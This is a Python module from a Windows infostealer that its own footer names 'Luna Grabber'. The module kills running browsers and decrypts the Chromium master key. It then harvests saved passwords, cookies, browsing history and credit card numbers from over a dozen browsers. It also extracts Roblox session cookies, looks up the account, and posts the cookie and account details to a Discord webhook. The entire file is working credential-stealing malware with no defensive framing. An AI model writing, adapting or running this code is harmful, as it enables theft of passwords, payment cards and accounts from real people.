import base64
import json
import os
import psutil
import random
import requests
import sqlite3
import threading
from Cryptodome.Cipher import AES
from shutil import copy2
from typing import Union
from win32crypt import CryptUnprotectData

class Browsers:
	def __init__(self):
		self.appdata = os.getenv('LOCALAPPDATA')
		self.roaming = os.getenv('APPDATA')
		self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
							"7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
		self.browsers_found = []
		self.browsers = {
			'kometa': self.appdata + '\\Kometa\\User Data',
			'orbitum': self.appdata + '\\Orbitum\\User Data',
			'cent-browser': self.appdata + '\\CentBrowser\\User Data',
			'7star': self.appdata + '\\7Star\\7Star\\User Data',
			'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
			'vivaldi': self.appdata + '\\Vivaldi\\User Data',
			'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
			'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
			'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
			'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
			'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
			'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
			'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
			'iridium': self.appdata + '\\Iridium\\User Data',
			'opera': self.roaming + '\\Opera Software\\Opera Stable',
			'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
		}

		self.profiles = [
			'Default',
			'Profile 1',
			'Profile 2',
			'Profile 3',
			'Profile 4',
			'Profile 5',
		]

		for proc in psutil.process_iter(['name']):
			process_name = proc.info['name'].lower()
			if process_name in self.browser_exe:
				self.browsers_found.append(proc)

		for proc in self.browsers_found:
			try:
				proc.kill()
			except Exception:
				pass

		os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)

		def process_browser(name, path, profile, func):
			try:
				func(name, path, profile)
			except Exception:
				pass

		threads = []
		for name, path in self.browsers.items():
			if not os.path.isdir(path):
				continue

			self.masterkey = self.get_master_key(path + '\\Local State')
			self.funcs = [
				self.cookies,
				self.history,
				self.passwords,
				self.credit_cards
			]

			for profile in self.profiles:
				for func in self.funcs:
					thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
					thread.start()
					threads.append(thread)

		for thread in threads:
			thread.join()

		self.roblox_cookies()
		self.robloxinfo(__CONFIG__["webhook"])

	def get_master_key(self, path: str) -> str:
		try:
			with open(path, "r", encoding="utf-8") as f:
				c = f.read()
			local_state = json.loads(c)
			master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
			master_key = master_key[5:]
			master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
			return master_key
		except Exception:
			pass

	def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
		iv = buff[3:15]
		payload = buff[15:]
		cipher = AES.new(master_key, AES.MODE_GCM, iv)
		decrypted_pass = cipher.decrypt(payload)
		decrypted_pass = decrypted_pass[:-16].decode()
		return decrypted_pass

	def passwords(self, name: str, path: str, profile: str):
		if name == 'opera' or name == 'opera-gx':
			path += '\\Login Data'
		else:
			path += '\\' + profile + '\\Login Data'
		if not os.path.isfile(path):
			return
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
		cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
		password_file_path = os.path.join(temp_path, "Browser", "passwords.txt")
		for results in cursor.fetchall():
			if not results[0] or not results[1] or not results[2]:
				continue
			url = results[0]
			login = results[1]
			password = self.decrypt_password(results[2], self.masterkey)
			with open(password_file_path, "a", encoding="utf-8") as f:
				if os.path.getsize(password_file_path) == 0:
					f.write("Website  |  Username  |  Password\n\n")
				f.write(f"{url}  |  {login}  |  {password}\n")
		cursor.close()
		conn.close()

	def cookies(self, name: str, path: str, profile: str):
		if name == 'opera' or name == 'opera-gx':
			path += '\\Network\\Cookies'
		else:
			path += '\\' + profile + '\\Network\\Cookies'
		if not os.path.isfile(path):
			return
		cookievault = create_temp()
		copy2(path, cookievault)
		conn = sqlite3.connect(cookievault)
		cursor = conn.cursor()
		with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
			f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
			for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
				host_key, name, path, encrypted_value, expires_utc = res
				value = self.decrypt_password(encrypted_value, self.masterkey)
				if host_key and name and value != "":
					f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
		cursor.close()
		conn.close()
		os.remove(cookievault)

	def history(self, name: str, path: str, profile: str):
		if name == 'opera' or name == 'opera-gx':
			path += '\\History'
		else:
			path += '\\' + profile + '\\History'
		if not os.path.isfile(path):
			return
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
		history_file_path = os.path.join(temp_path, "Browser", "history.txt")
		with open(history_file_path, 'a', encoding="utf-8") as f:
			if os.path.getsize(history_file_path) == 0:
				f.write("Url  |  Visit Count\n\n")
			for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
				url, visit_count = res
				f.write(f"{url}  |  {visit_count}\n")
		cursor.close()
		conn.close()

	def credit_cards(self, name: str, path: str, profile: str):
		if name in ['opera', 'opera-gx']:
			path += '\\Web Data'
		else:
			path += '\\' + profile + '\\Web Data'
		if not os.path.isfile(path):
			return
		conn = sqlite3.connect(path)
		cursor = conn.cursor()
		cc_file_path = os.path.join(temp_path, "Browser", "cc's.txt")
		with open(cc_file_path, 'a', encoding="utf-8") as f:
			if os.path.getsize(cc_file_path) == 0:
				f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
			for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
				name_on_card, expiration_month, expiration_year, card_number_encrypted = res
				card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
				f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
		cursor.close()
		conn.close()

	def roblox_cookies(self):
		if not __CONFIG__["roblox"]:
			pass
		else:
			robo_cookie_file = os.path.join(temp_path, "Browser", "roblox cookies.txt")
			robo_cookie = ""
			with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'r', encoding="utf-8") as g:
				with open(robo_cookie_file, 'w', encoding="utf-8") as f:
					for line in g:
						if ".ROBLOSECURITY" in line:
							robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
							f.write(robo_cookie + "\n\n")
					if os.path.getsize(robo_cookie_file) == 0:
						f.write("No Roblox Cookies Found")
						
	def robloxinfo(self, webhook):
		if __CONFIG__["roblox"]:
			with open(os.path.join(temp_path, "Browser", "roblox cookies.txt"), 'r', encoding="utf-8") as f:
				robo_cookie = f.read().strip()
				if robo_cookie == "No Roblox Cookies Found":
					pass
				else:
					headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
					info = None
					try:
						response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
						response.raise_for_status()
						info = response.json()
					except requests.exceptions.HTTPError:
						pass
					except requests.exceptions.RequestException:
						pass
					if info is not None:
						data = {
							"embeds": [
								{
									"title": "Roblox Info",
									"color": 5639644,
									"fields": [
										{
											"name": "<:roblox_icon:1041819334969937931> Name:",
											"value": f"`{info['UserName']}`",
											"inline": True
										},
										{
											"name": "<:robux_coin:1041813572407283842> Robux:",
											"value": f"`{info['RobuxBalance']}`",
											"inline": True
										},
										{
											"name": ":cookie: Cookie:",
											"value": f"`{robo_cookie}`"
										}
									],
									"thumbnail": {
										"url": info['ThumbnailUrl']
									},
									"footer": {
										"text": "Luna Grabber | Created By Smug"
									},
								}
							],
							"username": "Luna",
							"avatar_url": "https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096",
						}
						requests.post(webhook, json=data)
						

def create_temp(_dir: Union[str, os.PathLike] = None):
	if _dir is None:
		_dir = os.path.expanduser("~/tmp")
	if not os.path.exists(_dir):
		os.makedirs(_dir)
	file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
	path = os.path.join(_dir, file_name)
	open(path, "x").close()
	return path